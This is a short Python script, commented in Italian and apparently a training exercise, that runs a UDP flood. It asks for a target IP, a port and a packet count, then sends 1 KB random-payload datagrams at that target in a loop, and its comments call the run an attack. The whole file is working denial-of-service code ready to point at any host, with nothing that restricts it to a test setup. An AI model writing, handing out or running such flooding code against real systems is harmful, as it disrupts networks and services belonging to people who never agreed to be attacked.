import socket
import random

def udp_flood(ip_target, port_target, num_pack):
    # si simula un UDP Flood con un numero preciso di pacchetti verso un determinato IP e una determinata porta
    try: #creiamo il socket UDP 
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print(f"Socket creato con successo, avvio dell'attacco verso {ip_target}:{port_target} per un totatel di {num_pack} pacchetti")
    except socket.error as e:
        print(f"Errore nella creazione del socket: {e}")
        return
    #fissiamo la grandezza del pacchetto da inviare a 1 kb
    packet_size = 1024
    payload = random._urandom(packet_size) 
    sent_packets = 0
    #inizia l'attacco
    while sent_packets < num_pack:
        try:
            sock.sendto(payload, (ip_target, port_target))
            sent_packets += 1
        except socket.error as e:
            print(f"Errore nell'invio del pacchetto: {e}")
    print(f"Attacco terminato. Inviati {sent_packets} pacchetti")
    sock.close() #una volta terminato l'attacco chiudiamo il socket creato in precedenza

#creaimo la funzione che avvia l'attacco, chiedendo all'utente di inserire ip, porta e numero di pacchetti

if __name__ == "__main__":
    try:
        ip_target = input("Inserisci l'indirizzo IP del target: ")
        port_target = int(input("Inserisci la porta UDP del target: "))
        num_pack = int(input("Inserisci il numero di pacchetti da inviare: "))
        #controlliamo se l'input dell'utente è valido e non manca qualche campo
        if not ip_target or not port_target or not num_pack:
            print("Errore: tutti i campi sono obbligatori.")
        else: #inviamo gli input a def udp_flood
            udp_flood(ip_target, port_target, num_pack)

    except ValueError:
        print("Errore: la porta e il numero di pacchetti devono essere numeri interi.")
    except Exception as e:
        print(f"Si è verificato un errore: {e}")    